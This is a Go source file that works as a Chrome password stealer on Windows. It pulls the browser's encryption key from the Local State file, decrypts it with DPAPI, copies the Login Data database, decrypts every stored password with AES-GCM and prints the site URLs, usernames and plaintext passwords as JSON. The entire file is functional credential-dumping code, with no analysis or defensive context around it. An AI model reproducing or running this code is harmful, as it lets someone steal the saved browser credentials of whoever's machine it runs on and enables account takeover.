package main

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
	_ "github.com/mattn/go-sqlite3"
)

type LoginEntry struct {
	URL      string `json:"url"`
	Username string `json:"username"`
	Password string `json:"password"`
}

func getMasterKey() ([]byte, error) {
	localStatePath := filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Local State")
	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil, err
	}

	// Extract base64 encrypted key from JSON
	var localState map[string]interface{}
	json.Unmarshal(data, &localState)
	encKeyB64 := localState["os_crypt"].(map[string]interface{})["encrypted_key"].(string)

	encKey, err := base64.StdEncoding.DecodeString(encKeyB64)
	if err != nil {
		return nil, err
	}

	// Remove "DPAPI" prefix
	encKey = encKey[5:]

	// Decrypt using Windows DPAPI
	var outBlob windows.DataBlob
	inBlob := windows.DataBlob{
		Size: uint32(len(encKey)),
		Data: &encKey[0],
	}
	err = windows.CryptUnprotectData(&inBlob, nil, nil, 0, nil, 0, &outBlob)
	if err != nil {
		return nil, err
	}
	defer syscall.LocalFree(syscall.Handle(uintptr(unsafe.Pointer(outBlob.Data))))

	return outBlobToBytes(outBlob), nil
}

func outBlobToBytes(blob windows.DataBlob) []byte {
	data := make([]byte, blob.Size)
	copy(data, (*[1 << 30]byte)(unsafe.Pointer(blob.Data))[:])
	return data
}

func decryptPassword(encrypted []byte, key []byte) (string, error) {
	if !strings.HasPrefix(string(encrypted), "v10") {
		return "", fmt.Errorf("unsupported format")
	}
	encrypted = encrypted[3:]

	iv := encrypted[:12]
	ciphertext := encrypted[12 : len(encrypted)-16]
	tag := encrypted[len(encrypted)-16:]

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	plaintext, err := aesgcm.Open(nil, iv, append(ciphertext, tag...), nil)
	if err != nil {
		return "", err
	}
	return string(plaintext), nil
}

func main() {
	aesKey, err := getMasterKey()
	if err != nil {
		fmt.Println("[!] Failed to get master key:", err)
		return
	}
	fmt.Printf("[+] AES Key (hex): %s\n", hex.EncodeToString(aesKey))

	loginDataPath := filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Login Data")
	tmpPath := filepath.Join(os.TempDir(), "LoginData_copy.db")
	input, err := os.ReadFile(loginDataPath)
	if err != nil {
		fmt.Println("[!] Failed to read Login Data:", err)
		return
	}
	os.WriteFile(tmpPath, input, 0600)

	db, err := sql.Open("sqlite3", tmpPath)
	if err != nil {
		fmt.Println("[!] Failed to open database:", err)
		return
	}
	defer db.Close()

	rows, err := db.Query(`SELECT origin_url, username_value, password_value FROM logins`)
	if err != nil {
		fmt.Println("[!] Query failed:", err)
		return
	}
	defer rows.Close()

	var results []LoginEntry

	for rows.Next() {
		var url, username string
		var encPwd []byte

		err = rows.Scan(&url, &username, &encPwd)
		if err != nil {
			continue
		}

		decPwd, err := decryptPassword(encPwd, aesKey)
		if err != nil {
			continue
		}

		entry := LoginEntry{
			URL:      url,
			Username: username,
			Password: decPwd,
		}
		results = append(results, entry)
	}

	jsonOutput, _ := json.MarshalIndent(results, "", "  ")
	fmt.Println(string(jsonOutput))
}
